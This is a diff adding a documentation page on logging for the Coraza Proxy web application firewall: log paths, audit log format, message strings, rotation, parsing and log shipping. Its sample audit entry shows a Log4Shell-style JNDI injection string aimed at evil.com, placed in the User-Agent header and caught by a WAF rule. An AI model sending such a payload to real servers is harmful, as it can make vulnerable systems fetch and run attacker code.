@@ -1,0 +1,375 @@
+---
+title: Logging Configuration
+description: Configure and manage Coraza Proxy logging including audit logs, debug logs, and application logs
+---
+
+Coraza Proxy provides multiple logging layers to track security events, debug issues, and monitor operations. This guide covers log types, locations, formats, and configuration.
+
+## Log File Locations
+
+The proxy creates log files during startup (main.go:344-368):
+
+### Audit Log
+
+**Path**: `/tmp/log/coraza/audit.log`  
+**Permissions**: `0644`  
+**Format**: JSON
+
+Created automatically on startup:
+```go
+// main.go:345-358
+err := os.MkdirAll("/tmp/log/coraza", 0755)
+_, err = os.Create("/tmp/log/coraza/audit.log")
+err = os.Chmod("/tmp/log/coraza/audit.log", 0644)
+```
+
+Configured in `coraza.conf`:
+```apache
+SecAuditEngine RelevantOnly
+SecAuditLogFormat JSON
+SecAuditLogParts ABIJDEFHZ
+SecAuditLog /tmp/log/coraza/audit.log
+```
+
+### Debug Log
+
+**Path**: `/tmp/log/coraza/debug.log`  
+**Permissions**: `0644`
+
+Created automatically on startup:
+```go
+// main.go:360-368
+_, err = os.Create("/tmp/log/coraza/debug.log")
+err = os.Chmod("/tmp/log/coraza/debug.log", 0644)
+```
+
+By default, debug logging is **disabled** (`SecDebugLogLevel 0` in coraza.conf).
+
+### Application Log
+
+**Output**: stdout/stderr  
+**Format**: Plain text
+
+Standard Go logging via the `log` package. All operational messages, errors, and informational logs are written to standard output.
+
+## Log Directory Structure
+
+```
+/tmp/log/coraza/
+├── audit.log    # WAF security events (JSON format)
+└── debug.log    # Debug output (when enabled)
+```
+
+The directory `/tmp/log/coraza` is created with permissions `0755` during proxy startup.
+
+## Audit Log Format
+
+### Configuration
+
+```apache
+SecAuditEngine RelevantOnly
+SecAuditLogFormat JSON
+SecAuditLogParts ABIJDEFHZ
+```
+
+**SecAuditEngine RelevantOnly**: Only logs transactions that trigger rules or are blocked  
+**SecAuditLogFormat JSON**: Structured JSON output for parsing  
+**SecAuditLogParts ABIJDEFHZ**: Includes specific transaction parts
+
+### Audit Log Parts
+
+- **A**: Audit log header (mandatory)
+- **B**: Request headers
+- **I**: Request body (POST payload)
+- **J**: Additional information
+- **D**: Reserved for intermediary response headers
+- **E**: Intermediary response body
+- **F**: Final response headers
+- **H**: Audit trailer (includes rule matches)
+- **Z**: Final boundary
+
+### Example Audit Entry
+
+```json
+{
+  "transaction": {
+    "time": "2026-03-04T10:15:30Z",
+    "transaction_id": "abc123...",
+    "client_ip": "192.168.1.100",
+    "client_port": 54321,
+    "host_ip": "10.0.0.1",
+    "host_port": 8081,
+    "server_id": "coraza-proxy",
+    "request": {
+      "method": "POST",
+      "uri": "/api/users",
+      "http_version": "HTTP/1.1",
+      "headers": {
+        "User-Agent": "${jndi:ldap://evil.com}",
+        "Content-Type": "application/json"
+      },
+      "body": "{\"user\":\"test\"}"
+    },
+    "messages": [
+      {
+        "message": "Potentially Malicious User Agent",
+        "data": "${jndi:ldap://evil.com}",
+        "file": "rules/REQUEST-920-PROTOCOL-ENFORCEMENT.conf",
+        "line": 450,
+        "id": 920440,
+        "severity": "CRITICAL",
+        "maturity": 9,
+        "accuracy": 9
+      }
+    ]
+  }
+}
+```
+
+## Application Log Messages
+
+### Startup Messages
+
+```
+GeoIP database loaded
+Coraza WAF started
+Listening on :8081
+```
+
+### Request Processing
+
+```
+Processing request for <HOST>
+```
+
+Logged for every incoming request (main.go:460).
+
+### Configuration Errors
+
+```
+Invalid PORT, using 8081
+```
+
+Logged when the `PORT` environment variable is invalid (main.go:183).
+
+```
+WAF not configured for host: <HOST>
+```
+
+Logged when a request arrives for an unconfigured host (main.go:473).
+
+### Security Events
+
+**WAF Blocks**:
+```
+Request blocked by WAF (headers)
+Request blocked by WAF (body)
+```
+
+Logged when WAF rules block a request (main.go:504, 530).
+
+**Rate Limiting**:
+```
+Too Many Requests - IP blocked <IP_ADDRESS>
+```
+
+Logged when an IP exceeds rate limits (main.go:442).
+
+**GeoIP Blocks**:
+```
+[GEO] blocked <IP_ADDRESS> from <COUNTRY_CODE>
+```
+
+Logged when geographic filtering blocks a request (main.go:435).
+
+**Bot Blocks**:
+```
+Bot blocked <IP_ADDRESS>
+```
+
+Logged when bot detection blocks a request (main.go:453).
+
+**IP Reputation**:
+```
+[REPUTATION] checking <IP_ADDRESS>
+```
+
+Logged when IP reputation checking is enabled (main.go:429).
+
+### Backend Errors
+
+```
+Bad Gateway: <ERROR_DETAILS>
+```
+
+Logged when the backend connection fails (main.go:563).
+
+```
+Bad Gateway: backend not configured
+```
+
+Logged when no backend is configured for the request (main.go:548).
+
+### Transaction Errors
+
+```
+Error closing WAF transaction: <ERROR>
+```
+
+Logged when WAF transaction cleanup fails (main.go:483).
+
+```
+Error closing backend response body: <ERROR>
+```
+
+Logged when backend response cleanup fails (main.go:569).
+
+```
+Error reading body: <ERROR>
+```
+
+Logged when request body reading fails (main.go:514).
+
+```
+Error processing body: <ERROR>
+```
+
+Logged when WAF body processing fails (main.go:522).
+
+## Debug Logging
+
+### Enabling Debug Logs
+
+Modify your Coraza configuration file to enable debug logging:
+
+```apache
+SecDebugLogLevel 3
+SecDebugLog /tmp/log/coraza/debug.log
+```
+
+**Debug Levels**:
+- **0**: No debug logging (default)
+- **1**: Errors only
+- **2**: Warnings
+- **3**: Notices (recommended for troubleshooting)
+- **4**: Info
+- **5-9**: Increasingly verbose debug output
+
+### Warning
+
+Debug logging significantly impacts performance. Only enable when troubleshooting specific issues. Always set back to `0` in production.
+
+## Log Rotation
+
+The proxy does not implement built-in log rotation. Implement external log rotation using:
+
+### Using logrotate (Linux)
+
+Create `/etc/logrotate.d/coraza-proxy`:
+
+```
+/tmp/log/coraza/*.log {
+    daily
+    rotate 7
+    compress
+    delaycompress
+    missingok
+    notifempty
+    create 0644 root root
+    postrotate
+        # Send signal to reopen log files if needed
+    endscript
+}
+```
+
+### Using Docker Logging Drivers
+
+If running in Docker, configure logging drivers:
+
+```yaml
+services:
+  coraza-proxy:
+    logging:
+      driver: "json-file"
+      options:
+        max-size: "10m"
+        max-file: "3"
+```
+
+## Log Parsing and Analysis
+
+### Parse JSON Audit Logs
+
+Using `jq` to analyze audit logs:
+
+```bash
+# Count blocks by rule ID
+jq -r '.transaction.messages[].id' /tmp/log/coraza/audit.log | sort | uniq -c
+
+# Extract blocked IPs
+jq -r '.transaction.client_ip' /tmp/log/coraza/audit.log | sort | uniq
+
+# Find high severity events
+jq 'select(.transaction.messages[].severity == "CRITICAL")' /tmp/log/coraza/audit.log
+```
+
+### Parse Application Logs
+
+```bash
+# Count WAF blocks
+grep "blocked by WAF" /var/log/app.log | wc -l
+
+# Find rate-limited IPs
+grep "Too Many Requests" /var/log/app.log | awk '{print $NF}' | sort | uniq -c
+
+# Monitor GeoIP blocks by country
+grep "\[GEO\] blocked" /var/log/app.log | awk '{print $NF}' | sort | uniq -c
+```
+
+## Centralized Logging
+
+### Shipping to ELK Stack
+
+**Filebeat configuration** for shipping logs:
+
+```yaml
+filebeat.inputs:
+  - type: log
+    enabled: true
+    paths:
+      - /tmp/log/coraza/audit.log
+    json.keys_under_root: true
+    json.add_error_key: true
+    fields:
+      log_type: coraza_audit
+
+  - type: log
+    enabled: true
+    paths:
+      - /var/log/coraza-proxy/app.log
+    fields:
+      log_type: coraza_app
+
+output.elasticsearch:
+  hosts: ["elasticsearch:9200"]
+```
+
+### Shipping to Splunk
+
+```ini
+[monitor:///tmp/log/coraza/audit.log]
+sourcetype = coraza:audit:json
+index = security
+
+[monitor:///var/log/coraza-proxy/app.log]
+sourcetype = coraza:application
+index = application
+```
+
+## Performance Considerations
+
+- **Audit logging**: `RelevantOnly` mode reduces log volume significantly
+- **Debug logging**: Disable in production (SecDebugLogLevel 0)
+- **Log location**: `/tmp` is in-memory on many systems; consider persistent storage
+- **JSON parsing**: Structured logs enable efficient querying but may increase write overhead
+- **Log rotation**: Prevents disk exhaustion in high-traffic environments
